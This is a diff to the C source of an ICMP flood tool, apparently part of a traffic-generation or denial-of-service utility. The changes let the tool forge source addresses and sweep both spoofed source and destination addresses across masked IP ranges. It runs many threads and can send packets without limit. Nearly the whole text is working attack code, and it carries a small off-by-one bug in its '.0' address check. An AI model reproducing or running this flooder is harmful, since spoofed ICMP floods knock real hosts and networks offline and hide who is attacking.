@@ -11,8 +11,16 @@ unsigned int icmp_duration;
 double icmp_elapsed_time;
 char icmp_dest_ip[16];
 char icmp_src_ip[16];
+
+int icmp_src_ip_mask;
+int icmp_dest_ip_mask;
+
+char icmp_now_src_ip[16];
+char icmp_now_dest_ip[16];
+
 int icmp_dest_port;
 short icmp_timed_finisher;
+
 
 pthread_mutex_t icmp_mutex = PTHREAD_MUTEX_INITIALIZER;
 
@@ -26,16 +34,16 @@ clock_t icmp_global_elapsed_time;
 void icmp_flood_print_usage(int mode) {
 	if (mode == 1)
 		printf(
-				"ICMP flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests(0 for INF)] [Dest-Port] [Mask(0-32)] \n");
+				"ICMP flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests(0 for INF)] [Dest-Port] \n");
 	if (mode == 2)
 		printf(
-				"ICMP flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds(0 for INF)] [icmp_duration (0 for INF)] [Dest-Port] [Mask(0-32)]\n");
+				"ICMP flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds(0 for INF)] [icmp_duration (0 for INF)] [Dest-Port]\n");
 }
 
 void* generate_icmp_request1(void *data) {
-	int mask = *((int*) data);
+	//int mask = *((int*) data);
 	int sock = make_socket(IPPROTO_ICMP);
-	char icmp_now_ip[16];
+
 	while (1) {
 
 		struct icmp *p;
@@ -46,12 +54,12 @@ void* generate_icmp_request1(void *data) {
 		struct iphdr ipv4_h;
 		ipv4_h = prepare_empty_ipv4();
 		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_ICMP);
-		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(icmp_src_ip));
+		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(icmp_now_src_ip));
 
 		//modify icmp_src_ip, increment 1.
 
 
-		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(icmp_dest_ip));
+		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(icmp_now_dest_ip));
 
 		p = (struct icmp*) buffer;
 		p->icmp_type = ICMP_ECHO;
@@ -67,7 +75,12 @@ void* generate_icmp_request1(void *data) {
 
 		pthread_mutex_lock(&icmp_mutex);
 
-		masking_next_ip_addr(icmp_src_ip, icmp_now_ip, mask);
+		masking_next_ip_addr(icmp_src_ip, icmp_now_src_ip, icmp_src_ip_mask);
+		masking_next_ip_addr(icmp_dest_ip, icmp_now_dest_ip, icmp_dest_ip_mask);
+
+		//0번 예외처리
+		if(icmp_now_dest_ip[strlen(icmp_now_dest_ip)]=='0' && icmp_now_dest_ip[strlen(icmp_now_dest_ip)-1]=='.' )
+			masking_next_ip_addr(icmp_dest_ip, icmp_now_dest_ip, icmp_dest_ip_mask);
 
 		if (icmp_produced >= icmp_total) {
 			pthread_mutex_unlock(&icmp_mutex);
@@ -87,11 +100,10 @@ void* generate_icmp_request1(void *data) {
 }
 
 void* generate_icmp_request2(void *data) {
-	int mask = *((int*) data);
+	//int mask = *((int*) data);
 	int sock = make_socket(IPPROTO_ICMP);
 	clock_t thread_clock;
-	char icmp_now_ip[16];
-	strcpy(icmp_now_ip,icmp_src_ip);
+
 	while (1) {
 
 		struct icmp *p;
@@ -99,16 +111,15 @@ void* generate_icmp_request2(void *data) {
 
 		memset(buffer, 0x00, sizeof(struct icmp));
 
-		printf("Mask : %d , nowip : %s\n",mask,icmp_now_ip);
 		struct iphdr ipv4_h;
 		ipv4_h = prepare_empty_ipv4();
 		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_ICMP);
-		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(icmp_now_ip));
+		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(icmp_now_src_ip));
 
 		//modify icmp_src_ip, increment 1.
 
 
-		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(icmp_dest_ip));
+		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(icmp_now_dest_ip));
 
 		p = (struct icmp*) buffer;
 		p->icmp_type = ICMP_ECHO;
@@ -123,7 +134,14 @@ void* generate_icmp_request2(void *data) {
 
 		pthread_mutex_lock(&icmp_mutex);
 
-		masking_next_ip_addr(icmp_src_ip, icmp_now_ip, mask);
+		printf("From : %s --> To : %s \n",icmp_now_src_ip, icmp_now_dest_ip);
+
+		masking_next_ip_addr(icmp_src_ip, icmp_now_src_ip, icmp_src_ip_mask);
+		masking_next_ip_addr(icmp_dest_ip, icmp_now_dest_ip, icmp_dest_ip_mask);
+
+		//0번 예외처리
+		if(icmp_now_dest_ip[strlen(icmp_now_dest_ip)]=='0' && icmp_now_dest_ip[strlen(icmp_now_dest_ip)-1]=='.' )
+					masking_next_ip_addr(icmp_dest_ip, icmp_now_dest_ip, icmp_dest_ip_mask);
 
 		thread_clock = clock();
 		icmp_elapsed_time = ((double) (thread_clock - icmp_global_elapsed_time))
@@ -184,24 +202,31 @@ void* icmp_time_check(void *data) {
 
 void icmp_flood_run(char *argv[], int mode) {
 
-	int mask = 0;
 	int argc = 0;
 	icmp_generated_count=0;
 	icmp_timed_finisher=0;
+
+
+
 
 	while (argv[argc] != NULL) {
 		argc++;
 	}
 
-	if (mode == 1 && argc != 6) {
+	if (mode == 1 && argc != 5) {
 		icmp_flood_print_usage(mode);
 		return;
-	} else if (mode == 2 && argc != 7) {
+	} else if (mode == 2 && argc != 6) {
 		icmp_flood_print_usage(mode);
 		return;
 	}
 
-	strcpy(icmp_src_ip, argv[0]);
+	get_ip_from_ip_addr(argv[0],icmp_src_ip);
+	icmp_src_ip_mask = get_mask_from_ip_addr(argv[0]);
+	strcpy(icmp_now_src_ip,icmp_src_ip);
+
+
+	//strcpy(icmp_src_ip, argv[0]);
 
 	icmp_produced = 0;
 	if (mode == 1)
@@ -210,7 +235,7 @@ void icmp_flood_run(char *argv[], int mode) {
 		icmp_dest_port = atoi(argv[4]);
 		if(icmp_total==0)
 			icmp_total = __UINT_MAXIMUM__;
-		mask = atoi(argv[5]);
+
 	}
 
 
@@ -226,14 +251,17 @@ void icmp_flood_run(char *argv[], int mode) {
 			icmp_duration = __UINT_MAXIMUM__;
 
 		icmp_dest_port = atoi(argv[5]);
-		mask = atoi(argv[6]);
-	}
 
-	printf("Maximum = %ld\n",__UINT_MAXIMUM__);
+	}
 
 	int num_threads = atoi(argv[2]);
 
-	strcpy(icmp_dest_ip,argv[1]);
+	get_ip_from_ip_addr(argv[1],icmp_dest_ip);
+	icmp_dest_ip_mask = get_mask_from_ip_addr(argv[1]);
+	strcpy(icmp_now_dest_ip,icmp_dest_ip);
+
+	printf("src>IP : %s\nsrc>mask : %d\n",icmp_src_ip,icmp_src_ip_mask);
+	printf("dest>IP : %s\ndest>mask : %d\n",icmp_dest_ip,icmp_dest_ip_mask);
 
 	int *generate_thread_id;
 	pthread_t *generate_thread;
@@ -252,10 +280,10 @@ void icmp_flood_run(char *argv[], int mode) {
 	for (i = 0; i < num_threads; i++) {
 		if (mode == 1)
 			pthread_create(&generate_thread[i], NULL, generate_icmp_request1,
-					&mask);
+					(void*) &generate_thread_id[i]);
 		if (mode == 2)
 			pthread_create(&generate_thread[i], NULL, generate_icmp_request2,
-					&mask);
+					(void*) &generate_thread_id[i]);
 	}
 
 	if (mode == 2) {
